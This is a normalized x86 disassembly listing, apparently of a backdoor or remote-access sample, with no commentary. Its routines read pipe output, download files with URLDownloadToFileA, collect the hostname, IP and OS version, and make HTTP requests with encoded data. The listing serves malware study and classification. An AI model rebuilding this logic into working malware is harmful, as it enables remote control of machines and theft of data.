lea ecx [ esp + 0x24 ]
push ecx
push edx
lea eax [ esp + esi + 0x2678 ]
push eax
push ebp
call ebx
test eax eax
je r-xdata
push 0x64
add esi eax
sub edi eax
call [ Sleep@IAT ]
test edi edi
ja r-xdata
call [ GetLastError@IAT ]
mov edx [ esp + 0x20 ]
mov [ edx ] eax
add esi [ esp + 0x24 ]
cmp esi [ esp + 0x14 ]
jb r-xdata
push 0x0
push 0x0
lea eax [ esp + 0x24 ]
push eax
push ebp
mov [ esp + 0x2c ] 0x0
call edi
test eax eax
je r-xdata
jmp r-xdata
sub_4038c0
push 0xffffffff
push sub_420e5b
mov eax [ fs : 0x0 ]
push eax
mov eax 0x2830
call sub_41c2a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2828 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2844 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push ebx
push ebx
push 0x1
push ebx
mov [ esp + 0x28 ] ebx
call [ CreateEventA@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
push ebx
push eax
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] ebx
xor eax eax
mov ecx [ esp + 0x2844 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x2828 ]
xor ecx esp
call sub_40e1e0
add esp 0x283c
retn 0x4
mov edi [ ReadFile@IAT ]
mov ebp [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
push ebx
lea edx [ esp + 0x1c ]
push edx
push ebx
push ebx
push ebx
push eax
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
mov esi [ esp + 0x18 ]
cmp esi ebx
jne r-xdata
push 0x27ff
lea ecx [ esp + 0x41 ]
push ebx
push ecx
mov [ esp + 0x48 ] bl
call sub_414890
add esp 0xc
cmp esi 0x2800
jbe r-xdata
push 0x5dc
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ rw-data ]
push ebx
lea edx [ esp + 0x20 ]
push edx
push esi
lea eax [ esp + 0x48 ]
push eax
push ecx
mov [ esp + 0x30 ] ebx
call edi
push rw-data
call ebp
lea eax [ esp + 0x3c ]
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] bl
lea edx [ eax + 0x1 ]
mov esi 0x27f6
mov [ esp + 0x18 ] esi
mov edx [ rw-data ]
push ebx
push edx
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x40 ]
push edx
lea ecx [ esp + 0x28 ]
call sub_409850
lea eax [ esp + 0x20 ]
push eax
mov [ esp + 0x2850 ] ebx
call sub_408f40
mov [ esp + 0x284c ] 0xffffffff
cmp [ esp + 0x38 ] 0x10
jb r-xdata
mov ecx [ rw-data ]
push ebx
push ecx
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0x24 ]
push ecx
call sub_40f2fb
add esp 0x4
sub_403a90
push 0xffffffff
push sub_420e16
mov eax [ fs : 0x0 ]
push eax
sub esp 0x43c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x438 ] eax
push ebx
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x444 ]
mov [ fs : 0x0 ] eax
push rw-data
call [ DeleteUrlCacheEntry@IAT ]
xor ebx ebx
push ebx
push ebx
push rw-data
push rw-data
push ebx
call URLDownloadToFileA
cmp eax ebx
jne r-xdata
push 0x3ff
lea edx [ esp + 0x45 ]
push ebx
push edx
mov [ esp + 0x4c ] bl
call sub_414890
add esp 0xc
call [ GetLastError@IAT ]
push eax
lea eax [ esp + 0x44 ]
push r--data
push eax
call sub_40e24c
add esp 0xc
push rw-data
call [ EnterCriticalSection@IAT ]
lea eax [ esp + 0x40 ]
mov [ esp + 0x20 ] 0xf
mov [ esp + 0x1c ] ebx
mov [ esp + 0xc ] bl
lea edx [ eax + 0x1 ]
mov edi edi
push rw-data
call [ EnterCriticalSection@IAT ]
push 0x16
push r--data
lea ecx [ esp + 0x2c ]
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x40 ] ebx
mov [ esp + 0x30 ] bl
call sub_409850
lea eax [ esp + 0x24 ]
push eax
mov [ esp + 0x450 ] ebx
call sub_408f40
cmp [ esp + 0x3c ] 0x10
jb r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x44 ]
push ecx
lea ecx [ esp + 0x10 ]
call sub_409850
lea edx [ esp + 0x8 ]
push edx
mov [ esp + 0x450 ] 0x1
call sub_408f40
cmp [ esp + 0x20 ] 0x10
jb r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
xor eax eax
mov ecx [ esp + 0x444 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov ecx [ esp + 0x438 ]
xor ecx esp
call sub_40e1e0
add esp 0x448
retn 0x4
mov ecx [ esp + 0x28 ]
push ecx
jmp r-xdata
mov eax [ esp + 0xc ]
push eax
call sub_40f2fb
add esp 0x4
sub_403c10
push 0xffffffff
push sub_420dcb
mov eax [ fs : 0x0 ]
push eax
mov eax 0x2430
call sub_41c2a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2428 ] eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x243c ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push 0x23ff
lea eax [ esp + 0x39 ]
push ebx
push eax
mov [ esp + 0x20 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x40 ] bl
call sub_414890
add esp 0xc
push ebx
push ebx
push 0x1
push ebx
call [ CreateEventA@IAT ]
mov ecx [ rw-data ]
push ebx
push ecx
mov [ rw-data ] eax
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
mov edx [ rw-data ]
push edx
call [ CloseHandle@IAT ]
mov [ rw-data ] ebx
xor eax eax
mov ecx [ esp + 0x243c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ esp + 0x2428 ]
xor ecx esp
call sub_40e1e0
add esp 0x243c
retn 0x4
mov esi [ EnterCriticalSection@IAT ]
lea ebx [ ebx ]
mov edx [ rw-data ]
push ebx
push ebx
lea eax [ esp + 0x18 ]
push eax
push 0x2400
lea ecx [ esp + 0x44 ]
push ecx
push edx
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
cmp [ esp + 0x10 ] ebx
jne r-xdata
push 0x2400
lea eax [ esp + 0x38 ]
push ebx
push eax
call sub_414890
mov eax [ rw-data ]
add esp 0xc
push ebx
lea ecx [ esp + 0x18 ]
push ecx
push 0x2400
lea edx [ esp + 0x40 ]
push edx
push eax
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push 0x7d0
call [ Sleep@IAT ]
jmp r-xdata
call [ GetLastError@IAT ]
push 0x1
call [ Sleep@IAT ]
cmp [ esp + 0x34 ] 0x19
jne r-xdata
mov ecx [ rw-data ]
push ebx
push ecx
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
push rw-data
call esi
lea eax [ esp + 0x3c ]
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov edx [ rw-data ]
push ebx
push edx
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x40 ]
push ecx
lea ecx [ esp + 0x20 ]
call sub_409850
lea edx [ esp + 0x18 ]
push edx
mov [ esp + 0x2448 ] ebx
call sub_408f40
mov [ esp + 0x2444 ] 0xffffffff
cmp [ esp + 0x30 ] 0x10
jb r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax [ esp + 0x1c ]
push eax
call sub_40f2fb
add esp 0x4
sub_403e10
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xcb4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xcb0 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x7ff
xor ebx ebx
lea ecx [ esp + 0x4bd ]
push ebx
push ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0x4c4 ] 0x0
call sub_414890
add esp 0xc
push 0x3ff
lea edx [ esp + 0xbd ]
push ebx
push edx
mov [ esp + 0xc4 ] bl
call sub_414890
xor eax eax
add esp 0xc
push 0x7f
mov [ esp + 0x2d ] eax
mov [ esp + 0x31 ] eax
mov [ esp + 0x35 ] eax
mov [ esp + 0x39 ] ax
mov [ esp + 0x3b ] al
mov [ esp + 0x3c ] al
lea eax [ esp + 0x3d ]
push ebx
push eax
mov [ esp + 0x34 ] bl
call sub_414890
add esp 0xc
call sub_40f2d9
cdq
mov ecx 0xc
idiv ecx
mov eax 0x66666667
mov [ esp + 0x38 ] ebx
mov edi edx
imul edi
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
lea edx [ eax + eax * 4 ]
mov esi edi
sub esi edx
add esi 0x4
je r-xdata
call sub_40f2d9
cdq
mov ecx 0x7f
idiv ecx
push 0xa
lea eax [ esp + 0x2c ]
push eax
sub edx 0xffffff80
push edx
call sub_4204d8
mov ecx [ rw-data ]
sub ecx [ rw-data ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov ecx edx
shr ecx 0x1f
add ecx edx
add esp 0xc
cmp edi ecx
jb r-xdata
nop
mov eax [ rw-data ]
lea edx [ edi + edi * 2 ]
lea ecx [ eax + edx * 8 ]
lea edx [ esp + 0x10 ]
push edx
call sub_408560
mov ecx [ esp + 0x20 ]
mov esi [ esp + 0x1c ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x8
ja r-xdata
call sub_40ee1a
call sub_40f2d9
xor edx edx
mov ecx 0x3f
div ecx
inc ebx
mov dl [ edx + r--data ]
mov [ esp + ebx + 0x37 ] dl
cmp ebx esi
jb r-xdata
mov edi 0x10
cmp [ esi + 0xf8 ] edi
jb r-xdata
call sub_40ee1a
mov esi [ esp + 0x1c ]
add esi 0xe4
mov esi [ esi + 0xe4 ]
jmp r-xdata
cmp [ ebx + 0x18 ] edi
jb r-xdata
call sub_40ee1a
mov ebx [ esp + 0x1c ]
lea ecx [ esp + 0x28 ]
push ecx
lea edx [ esp + 0x3c ]
push edx
lea eax [ esp + 0xc0 ]
push esi
push eax
call sub_40e24c
mov ecx [ esp + 0x30 ]
mov ebx [ esp + 0x2c ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add esp 0x10
add ecx edx
jne r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x4b8 ]
sub eax esi
dec edi
mov esi eax
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x20 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
cmp [ ebx + 0x34 ] 0x10
jb r-xdata
call sub_40ee1a
mov ebx [ esp + 0x1c ]
lea eax [ ebx + 0x20 ]
mov eax [ ebx + 0x20 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x4b8 ]
sub eax edx
dec edi
mov edx eax
mov edi edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ esp + 0xb8 ]
[ edi ] [ esi ]
mov ecx eax
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0x4b8 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ esp + 0x4b8 ]
[ edi ] [ esi ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov edi eax
mov eax [ ebp + 0xc ]
cmp edi eax
jb r-xdata
mov esi [ esp + 0xc ]
push eax
xor ebx ebx
push ebx
push esi
call sub_414890
lea eax [ esp + 0x4c4 ]
mov edx esi
mov ecx eax
add esp 0xc
sub edx ecx
jmp r-xdata
xor esi esi
cmp ebx esi
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov eax [ esp + 0x10 ]
push eax
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] esi
mov [ esp + 0x28 ] esi
call sub_40f2fb
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xcb0 ]
xor ecx esp
call sub_40e1e0
mov esp ebp
pop ebp
retn
mov ecx [ esp + 0xc ]
mov edi [ esp + 0x20 ]
push ecx
mov eax ebx
call sub_40b130
mov edx [ esp + 0x20 ]
add esp 0x4
push edx
call sub_40f2fb
add esp 0x4
mov eax [ esp + 0x1c ]
mov [ esi + edi ] cl
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
call sub_40f2fb
mov ecx [ esp + 0xcc0 ]
add esp 0x4
pop edi
pop esi
pop ebx
xor ecx esp
mov eax 0x1
call sub_40e1e0
mov esp ebp
pop ebp
retn
mov edx [ esp + 0xc ]
mov edi [ esp + 0x20 ]
push edx
call sub_40b130
mov eax [ esp + 0x20 ]
add esp 0x4
push eax
call sub_40f2fb
add esp 0x4
sub_4041a0
push 0xffffffff
push sub_421190
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4c ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x4
call sub_40fd2d
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
xor eax eax
lea edx [ esp + 0x14 ]
mov [ eax ] edx
jmp r-xdata
mov dl [ eax ]
inc eax
cmp dl cl
jne r-xdata
sub eax esi
push eax
push edi
lea ecx [ esp + 0x34 ]
call sub_409850
lea eax [ esp + 0x2c ]
push eax
lea ebx [ esp + 0x18 ]
mov [ esp + 0x58 ] 0x2
call sub_4086c0
mov [ esp + 0x54 ] 0x1
cmp [ esp + 0x44 ] 0x10
jb r-xdata
mov [ esp + 0x14 ] eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] ecx
mov [ esp + 0x28 ] ecx
mov [ esp + 0x54 ] 0x1
mov eax edi
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x40 ] ecx
mov [ esp + 0x30 ] cl
lea esi [ eax + 0x1 ]
nop
mov esi [ esp + 0x5c ]
mov edi 0x8
lea esp [ esp ]
mov ecx [ esp + 0x30 ]
push ecx
call sub_40f2fb
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ esp + 0x34 ]
call sub_409850
lea edx [ esp + 0x2c ]
push edx
lea ebx [ esp + 0x18 ]
mov [ esp + 0x58 ] 0x3
call sub_4086c0
mov [ esp + 0x54 ] 0x1
cmp [ esp + 0x44 ] 0x10
jb r-xdata
add esi 0xa0
sub edi 0x1
jne r-xdata
mov eax [ esp + 0x30 ]
push eax
call sub_40f2fb
add esp 0x4
xor ebx ebx
mov eax esi
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x40 ] ebx
mov [ esp + 0x30 ] bl
lea edx [ eax + 0x1 ]
lea ebx [ esp + 0x14 ]
call sub_4084c0
mov eax [ esp + 0x20 ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov eax [ esp + 0x14 ]
push eax
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
call sub_40f2fb
add esp 0x4
mov ecx [ esp + 0x4c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x48
retn
mov edi [ esp + 0x24 ]
cmp eax edi
je r-xdata
push eax
call sub_40f2fb
add esp 0x4
lea esi [ eax + 0x18 ]
mov [ esi ] 0xf
mov [ esi - 0x4 ] ebx
mov [ esi - 0x14 ] bl
add esi 0x1c
lea edx [ esi - 0x18 ]
cmp edx edi
jne r-xdata
mov ecx [ esi - 0x14 ]
push ecx
call sub_40f2fb
add esp 0x4
cmp [ esi ] 0x10
jb r-xdata
mov eax [ esp + 0x20 ]
sub_404340
push ecx
push rw-data
mov ecx rw-data
call sub_4041a0
add esp 0x4
push rw-data
mov ecx rw-data
call sub_4041a0
add esp 0x4
push rw-data
mov ecx rw-data
call sub_4041a0
add esp 0x4
push rw-data
mov ecx rw-data
call sub_4041a0
add esp 0x4
push rw-data
mov ecx rw-data
call sub_4041a0
add esp 0x4
push rw-data
mov ecx rw-data
call sub_4041a0
add esp 0x4
push rw-data
mov ecx rw-data
call sub_4041a0
add esp 0x4
push rw-data
mov ecx rw-data
call sub_4041a0
add esp 0x4
push rw-data
mov ecx rw-data
call sub_4041a0
add esp 0x4
push rw-data
mov ecx rw-data
call sub_4041a0
add esp 0x4
push rw-data
mov ecx rw-data
call sub_4041a0
add esp 0x4
push rw-data
mov ecx rw-data
call sub_4041a0
add esp 0x4
pop ecx
retn
sub_404420
push 0xffffffff
push sub_42095b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x11c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x118 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x12c ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push 0x3f
lea eax [ esp + 0xed ]
push ebx
push eax
mov [ esp + 0xf4 ] bl
call sub_414890
xor eax eax
add esp 0xc
push 0x40
lea ecx [ esp + 0xec ]
push ecx
mov [ esp + 0xd0 ] bl
mov [ esp + 0xd1 ] eax
mov [ esp + 0xd5 ] eax
mov [ esp + 0xd9 ] eax
mov [ esp + 0xdd ] eax
mov [ esp + 0xe1 ] eax
mov [ esp + 0xe5 ] eax
mov [ esp + 0xe9 ] eax
mov [ esp + 0xed ] ax
mov [ esp + 0xef ] al
call gethostname
lea edx [ esp + 0xe8 ]
push edx
call gethostbyname
mov eax [ eax + 0xc ]
mov ecx [ eax ]
mov edx [ ecx ]
push edx
call inet_ntoa
mov edi eax
lea eax [ esp + 0x2c ]
push eax
mov [ esp + 0x30 ] 0x9c
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
push ebx
push r--data
lea ecx [ esp + 0x18 ]
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
call sub_409850
mov [ esp + 0x134 ] ebx
cmp [ esp + 0x24 ] ebx
je r-xdata
mov [ esp + 0xc7 ] 0xff
push 0x4
push r--data
lea eax [ esp + 0x18 ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x18 ]
call sub_409740
lea eax [ esp + 0xe8 ]
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov bl 0x26
lea esi [ esp + 0x10 ]
call sub_408a80
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0xec ]
push ecx
lea eax [ esp + 0x18 ]
call sub_409740
cmp [ esp + 0x24 ] 0x0
je r-xdata
push 0x4
push r--data
lea eax [ esp + 0x18 ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x18 ]
call sub_409740
mov eax edi
lea edx [ eax + 0x1 ]
mov bl 0x26
lea esi [ esp + 0x10 ]
call sub_408a80
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
lea eax [ esp + 0x18 ]
call sub_409740
cmp [ esp + 0x24 ] 0x0
je r-xdata
push 0x4
push r--data
lea eax [ esp + 0x18 ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x18 ]
call sub_409740
mov eax rw-data
lea edx [ eax + 0x1 ]
mov bl 0x26
lea esi [ esp + 0x10 ]
call sub_408a80
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push rw-data
lea eax [ esp + 0x18 ]
call sub_409740
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x30 ]
push edx
push eax
lea ecx [ esp + 0xd0 ]
push r--data
push ecx
call sub_40e24c
add esp 0x10
cmp [ esp + 0x24 ] 0x0
je r-xdata
push 0x3
push r--data
lea eax [ esp + 0x18 ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x18 ]
call sub_409740
lea eax [ esp + 0xc8 ]
lea edx [ eax + 0x1 ]
mov bl 0x26
lea esi [ esp + 0x10 ]
call sub_408a80
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0xcc ]
push edx
lea eax [ esp + 0x18 ]
call sub_409740
cmp [ esp + 0x24 ] 0x0
je r-xdata
push 0x4
push r--data
lea eax [ esp + 0x18 ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x18 ]
call sub_409740
mov eax rw-data
lea edx [ eax + 0x1 ]
mov bl 0x26
lea esi [ esp + 0x10 ]
call sub_408a80
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push rw-data
lea eax [ esp + 0x18 ]
call sub_409740
cmp [ esp + 0x24 ] 0x0
je r-xdata
push 0x5
push r--data
lea eax [ esp + 0x18 ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x18 ]
call sub_409740
push 0x0
push r--data
lea eax [ esp + 0x18 ]
call sub_409740
cmp [ esp + 0x28 ] 0x10
mov eax [ esp + 0x14 ]
jae r-xdata
mov bl 0x26
lea esi [ esp + 0x10 ]
call sub_408a80
lea edx [ eax + 0x1 ]
lea eax [ esp + 0x14 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov ecx eax
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
lea eax [ edx + edx * 2 ]
sub ecx eax
cmp ecx 0x1
jne r-xdata
cmp ecx 0x2
jne r-xdata
push 0x2
push r--data
jmp r-xdata
mov esi [ esp + 0x28 ]
mov eax [ esp + 0x14 ]
mov [ rw-data ] 0x0
cmp esi 0x10
jae r-xdata
push 0x1
push r--data
lea eax [ esp + 0x18 ]
call sub_409740
mov ecx [ esp + 0x24 ]
push ecx
push eax
push rw-data
call sub_4158c0
add esp 0xc
cmp esi 0x10
jb r-xdata
lea eax [ esp + 0x14 ]
mov ecx [ esp + 0x12c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x118 ]
xor ecx esp
call sub_40e1e0
add esp 0x128
retn
mov edx [ esp + 0x14 ]
push edx
call sub_40f2fb
add esp 0x4
sub_4047f0
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
xor eax eax
push esi
mov [ esp + 0x5 ] eax
mov [ esp + 0x9 ] eax
mov [ esp + 0xd ] eax
mov [ esp + 0x11 ] ax
mov [ esp + 0x13 ] al
push 0xa
lea eax [ esp + 0x8 ]
push eax
push ecx
mov esi edx
mov [ esp + 0x10 ] 0x0
call sub_4204d8
add esp 0xc
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
push ebx
mov bl 0x3b
call sub_408a80
pop ebx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
mov eax esi
call sub_409740
push 0x1
push r--data
mov eax esi
call sub_409740
lea eax [ esp + 0x4 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x8 ]
push edx
mov eax esi
call sub_409740
mov ecx [ esp + 0x14 ]
pop esi
xor ecx esp
call sub_40e1e0
add esp 0x14
retn
sub_404890
sub esp 0x804
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x800 ] eax
push ebp
mov ebp [ esp + 0x80c ]
push 0x7ff
lea eax [ esp + 0x9 ]
push 0x0
push eax
mov [ esp + 0x10 ] 0x0
call sub_414890
add esp 0xc
xor eax eax
test esi esi
jbe r-xdata
push esi
lea ecx [ esp + 0x8 ]
mov edx ebp
call sub_4012c0
mov ecx [ esp + 0x808 ]
add esp 0x4
pop ebp
xor ecx esp
call sub_40e1e0
add esp 0x804
retn
push edi
mov edi [ esp + 0x814 ]
lea ecx [ esp + 0x8 ]
sub edi ecx
lea esp [ esp ]
lea ecx [ esp + eax + 0x8 ]
movzx edx [ edi + ecx ]
mov dl [ edx + rw-data ]
inc eax
mov [ ecx ] dl
cmp eax esi
jb r-xdata
pop edi
sub_404920
sub esp 0x804
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x800 ] eax
push esi
push edi
push 0x7ff
lea eax [ esp + 0xd ]
push 0x0
push eax
mov esi ecx
mov edi edx
mov [ esp + 0x14 ] 0x0
call sub_414890
mov ecx [ esp + 0x81c ]
push ecx
lea edx [ esp + 0x18 ]
push edx
mov ecx edi
call sub_4015a0
mov edi eax
add esp 0x14
test edi edi
jle r-xdata
mov ecx [ esp + 0x808 ]
pop edi
pop esi
xor ecx esp
call sub_40e1e0
add esp 0x804
retn
lea edx [ esp + 0x8 ]
mov ecx esi
sub edx esi
mov esi edi
jmp r-xdata
movzx eax [ edx + ecx ]
mov al [ eax + rw-data ]
mov [ ecx ] al
inc ecx
sub esi 0x1
jne r-xdata
mov eax edi
sub_4049b0
mov eax 0x1030
call sub_41c2a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x102c ] eax
push ebx
push edi
xor ebx ebx
push 0xfff
lea eax [ esp + 0x39 ]
push ebx
push eax
mov [ esp + 0x40 ] bl
call sub_414890
add esp 0xc
mov [ esp + 0x8 ] 0x1000
mov [ esp + 0x10 ] ebx
mov [ esp + 0xc ] ebx
cmp esi ebx
je r-xdata
pop edi
xor eax eax
pop ebx
mov ecx [ esp + 0x102c ]
xor ecx esp
call sub_40e1e0
add esp 0x1030
retn
mov edi [ HttpQueryInfoA@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x10 ]
push edx
push ebx
push 0x2b
push esi
call edi
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x8 ]
ja r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0xc ]
push edx
lea eax [ esp + 0x3c ]
push eax
push 0x2b
push esi
call edi
cmp eax ebx
jne r-xdata
xor eax eax
lea ecx [ esp + 0x14 ]
push 0x3b
push ecx
mov edx r--data
lea ecx [ esp + 0x3c ]
mov [ esp + 0x1c ] bl
mov [ esp + 0x1d ] eax
mov [ esp + 0x21 ] eax
mov [ esp + 0x25 ] eax
mov [ esp + 0x29 ] eax
mov [ esp + 0x2d ] eax
mov [ esp + 0x31 ] eax
mov [ esp + 0x35 ] eax
mov [ esp + 0x39 ] ax
mov [ esp + 0x3b ] al
call sub_404ff0
add esp 0x8
test eax eax
je r-xdata
mov edx r--data
lea ecx [ esp + 0x14 ]
sbb eax eax
sbb eax 0xffffffff
cmp al bl
je r-xdata
xor eax eax
jmp r-xdata
mov al [ ecx + 0x1 ]
cmp al [ edx + 0x1 ]
jne r-xdata
mov ecx [ esp + 0x1034 ]
xor edx edx
cmp eax ebx
sete dl
pop edi
pop ebx
xor ecx esp
mov eax edx
call sub_40e1e0
add esp 0x1030
retn
add ecx 0x2
add edx 0x2
cmp al bl
jne r-xdata
mov al [ ecx ]
cmp al [ edx ]
jne r-xdata
sub_404af0
mov eax 0x40024
call sub_41c2a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40020 ] eax
cmp [ rw-data ] 0x0
mov eax [ esp + 0x40028 ]
push ebx
push ebp
push esi
push edi
mov [ esp + 0x18 ] eax
je r-xdata
mov ecx [ rw-data ]
mov edx [ ecx + 0x8 ]
push 0x0
push 0x84080000
push 0x0
push 0x0
push r--data
push r--data
push r--data
or edi 0xffffffff
push edx
mov [ esp + 0x40 ] edi
mov [ esp + 0x3c ] edi
call [ HttpOpenRequestA@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
mov edx [ rw-data ]
push 0x1
mov eax r--data
mov ecx r--data
call sub_40de90
mov ebp eax
jmp r-xdata
xor ebp ebp
mov esi [ InternetSetOptionA@IAT ]
push 0x4
lea eax [ esp + 0x18 ]
push eax
push 0x41
push ebp
mov [ esp + 0x24 ] 0x0
call esi
cmp [ esp + 0x20 ] edi
je r-xdata
mov ebx r--data
mov edi r--data
mov esi ebp
call sub_40df80
mov ebx r--data
mov edi r--data
call sub_40df80
mov ebx r--data
mov edi r--data
call sub_40df80
mov ebx r--data
mov edi r--data
call sub_40df80
mov ebx r--data
mov edi r--data
call sub_40df80
mov edi [ esp + 0x18 ]
mov eax [ edi + 0x14 ]
lea eax [ eax + eax * 4 ]
